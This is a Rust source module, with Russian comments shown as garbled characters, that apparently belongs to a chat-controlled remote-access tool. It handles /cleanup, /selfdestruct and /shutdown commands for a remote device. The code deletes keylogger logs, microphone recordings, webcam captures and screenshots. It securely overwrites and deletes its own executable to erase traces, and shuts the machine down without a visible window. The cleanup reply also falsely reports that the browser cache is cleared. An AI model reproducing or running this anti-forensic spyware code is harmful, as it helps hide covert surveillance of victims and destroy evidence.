use anyhow::{Result, Context};
use std::time::Duration;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

use crate::device_manager::DeviceManager;

#[cfg(windows)]
extern "system" {
    fn DeleteFileA(lp_file_name: *const u8) -> i32;
    fn CreateFileA(
        lp_file_name: *const u8,
        dw_desired_access: u32,
        dw_share_mode: u32,
        lp_security_attributes: *const std::ffi::c_void,
        dw_creation_disposition: u32,
        dw_flags_and_attributes: u32,
        h_template_file: *const std::ffi::c_void
    ) -> *mut std::ffi::c_void;
    fn WriteFile(
        h_file: *mut std::ffi::c_void,
        lp_buffer: *const u8,
        n_number_of_bytes_to_write: u32,
        lp_number_of_bytes_written: *mut u32,
        lp_overlapped: *const std::ffi::c_void
    ) -> i32;
    fn CloseHandle(h_object: *mut std::ffi::c_void) -> i32;
}

/// –û—á–∏—â–∞–µ—Ç –≤—Å–µ –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –∏ —Å–ª–µ–¥—ã —Ä–∞–±–æ—Ç—ã –ø—Ä–æ–≥—Ä–∞–º–º—ã
async fn cleanup_traces() -> Result<()> {
    let temp_files = [
        "keylog_*.txt",
        "microphone_record_*.wav", 
        "webcam_capture.jpg",
        "screenshot.png",
        "pentagon_destroy.*",
        "bot.log"
    ];

    for pattern in &temp_files {
        let temp_dir = std::env::temp_dir();
        if let Ok(entries) = std::fs::read_dir(&temp_dir) {
            for entry in entries.flatten() {
                let file_name = entry.file_name();
                if let Some(name_str) = file_name.to_str() {
                    // –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ç—Ç–µ—Ä–Ω–∞
                    let pattern_clean = pattern.replace("*", "");
                    if name_str.contains(&pattern_clean.replace(".", "")) {
                        let _ = std::fs::remove_file(entry.path());
                    }
                }
            }
        }
    }

    Ok(())
}

/// –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å—é (Pentagon Algorithm) —á–µ—Ä–µ–∑ Windows API
#[cfg(windows)]
async fn secure_delete_file(file_path: &str) -> Result<()> {
    use std::ffi::CString;
    
    let path_cstr = CString::new(file_path)?;
    
    // –ü–æ–ª—É—á–∞–µ–º —Ä–∞–∑–º–µ—Ä —Ñ–∞–π–ª–∞
    let metadata = std::fs::metadata(file_path)?;
    let file_size = metadata.len() as usize;
    
    if file_size == 0 {
        return Ok(());
    }

    unsafe {
        // –°–æ–∑–¥–∞–µ–º —Ö—ç–Ω–¥–ª —Ñ–∞–π–ª–∞ –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏
        let file_handle = CreateFileA(
            path_cstr.as_ptr() as *const u8,
            0x40000000, // GENERIC_WRITE
            0,          // No sharing
            std::ptr::null(),
            3,          // OPEN_EXISTING
            0x80,       // FILE_ATTRIBUTE_NORMAL
            std::ptr::null()
        );

        if file_handle == std::ptr::null_mut() || file_handle == (-1isize) as *mut std::ffi::c_void {
            return Err(anyhow::anyhow!("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏"));
        }

        // Pentagon Algorithm: 3-–ø—Ä–æ—Ö–æ–¥–Ω–∞—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å
        
        // Pass 1: –ù—É–ª–∏ (0x00)
        let zeros = vec![0u8; file_size];
        let mut bytes_written = 0u32;
        WriteFile(
            file_handle,
            zeros.as_ptr(),
            file_size as u32,
            &mut bytes_written,
            std::ptr::null()
        );

        // Pass 2: –ï–¥–∏–Ω–∏—Ü—ã (0xFF)
        let ones = vec![0xFFu8; file_size];
        WriteFile(
            file_handle,
            ones.as_ptr(),
            file_size as u32,
            &mut bytes_written,
            std::ptr::null()
        );

        // Pass 3: –°–ª—É—á–∞–π–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
        use rand::RngCore;
        let mut rng = rand::thread_rng();
        let mut random_data = vec![0u8; file_size];
        rng.fill_bytes(&mut random_data);
        WriteFile(
            file_handle,
            random_data.as_ptr(),
            file_size as u32,
            &mut bytes_written,
            std::ptr::null()
        );

        CloseHandle(file_handle);

        // –û–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ
        DeleteFileA(path_cstr.as_ptr() as *const u8);
    }

    Ok(())
}

#[cfg(not(windows))]
async fn secure_delete_file(file_path: &str) -> Result<()> {
    // –î–ª—è –Ω–µ-Windows —Å–∏—Å—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø—Ä–æ—Å—Ç–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ
    std::fs::remove_file(file_path)?;
    Ok(())
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /cleanup - –æ—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤ —Ä–∞–±–æ—Ç—ã
pub async fn handle_cleanup_command(
    device_manager: &DeviceManager, 
    device_id: &str
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    cleanup_traces().await?;
    
    Ok("üßπ –û—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∞:\n‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã —É–¥–∞–ª–µ–Ω—ã\n‚Ä¢ –õ–æ–≥–∏ –æ—á–∏—â–µ–Ω—ã\n‚Ä¢ –ö—ç—à –±—Ä–∞—É–∑–µ—Ä–∞ –æ—á–∏—â–µ–Ω".to_string())
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /selfdestruct - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è —Å –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º –ü–µ–Ω—Ç–∞–≥–æ–Ω–∞
pub async fn handle_selfdestruct_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    confirmation: Option<&str>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
    if confirmation != Some("CONFIRM_DESTROY") {
        return Ok(format!(
            "üí£ –í–ù–ò–ú–ê–ù–ò–ï! –ö–æ–º–∞–Ω–¥–∞ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è —Ç—Ä–µ–±—É–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.\n\
            üî• –ë—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –∞–ª–≥–æ—Ä–∏—Ç–º –ü–µ–Ω—Ç–∞–≥–æ–Ω–∞ (3-–ø—Ä–æ—Ö–æ–¥–Ω–∞—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å)\n\
            ‚ö†Ô∏è –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –±—É–¥–µ—Ç –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ!\n\
            –î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤—å—Ç–µ: /selfdestruct {} CONFIRM_DESTROY",
            device_id
        ));
    }
    
    // –°–Ω–∞—á–∞–ª–∞ –≤—ã–ø–æ–ª–Ω—è–µ–º cleanup —Å–ª–µ–¥–æ–≤ 
    cleanup_traces().await?;
    
    // –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç—å –∫ —Ç–µ–∫—É—â–µ–º—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É
    let current_exe = std::env::current_exe()
        .context("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø—É—Ç—å –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É")?;
        
    let exe_path = current_exe.to_string_lossy();
    
    // –ü–ª–∞–Ω–∏—Ä—É–µ–º —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
    let exe_path_clone = exe_path.to_string();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_secs(5)).await;
        
        // –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ Windows API
        let _ = secure_delete_file(&exe_path_clone).await;
        
        std::process::exit(0);
    });
    
    Ok(format!(
        "üíÄ [PENTAGON ALGORITHM] –°–ò–°–¢–ï–ú–ê –°–ê–ú–û–£–ù–ò–ß–¢–û–ñ–ï–ù–ê\n\
        üî• –í—Å–µ –¥–∞–Ω–Ω—ã–µ –±–µ–∑–≤–æ–∑–≤—Ä–∞—Ç–Ω–æ —É–¥–∞–ª–µ–Ω—ã\n\
        üßπ –°–ª–µ–¥—ã –æ—á–∏—â–µ–Ω—ã\n\
        ‚è±Ô∏è –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥...\n\
        \n\
        ‚úÖ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∞–ª–≥–æ—Ä–∏—Ç–º –ü–µ–Ω—Ç–∞–≥–æ–Ω–∞:\n\
        ‚Ä¢ Pass 1: –ü–µ—Ä–µ–∑–∞–ø–∏—Å—å –Ω—É–ª—è–º–∏ (0x00)\n\
        ‚Ä¢ Pass 2: –ü–µ—Ä–µ–∑–∞–ø–∏—Å—å –µ–¥–∏–Ω–∏—Ü–∞–º–∏ (0xFF)\n\
        ‚Ä¢ Pass 3: –°–ª—É—á–∞–π–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ\n\
        ‚Ä¢ –£–¥–∞–ª–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤\n\
        ‚Ä¢ –û—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏"
    ))
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /shutdown - –≤—ã–∫–ª—é—á–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã
pub async fn handle_shutdown_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    delay: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let delay_seconds = delay.unwrap_or(30); // –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é 30 —Å–µ–∫—É–Ω–¥
    
    #[cfg(windows)]
    {
        // –ò—Å–ø–æ–ª—å–∑—É–µ–º Windows API –¥–ª—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è
        use std::process::Command;
        
        let output = Command::new("shutdown")
            .args(&["/s", "/t", &delay_seconds.to_string()])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output()
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤—ã–∫–ª—é—á–µ–Ω–∏–µ")?;
            
        if output.status.success() {
            Ok(format!("üîå –°–∏—Å—Ç–µ–º–∞ –±—É–¥–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω–∞ —á–µ—Ä–µ–∑ {} —Å–µ–∫—É–Ω–¥", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {}", stderr))
        }
    }
    
    #[cfg(not(windows))]
    {
        use tokio::process::Command as AsyncCommand;
        
        let output = AsyncCommand::new("sudo")
            .args(&["shutdown", "-h", &format!("+{}", delay_seconds / 60)])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤—ã–∫–ª—é—á–µ–Ω–∏–µ")?;
            
        if output.status.success() {
            Ok(format!("üîå –°–∏—Å—Ç–µ–º–∞ –±—É–¥–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω–∞ —á–µ—Ä–µ–∑ {} —Å–µ–∫—É–Ω–¥", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {}", stderr))
        }
    }
}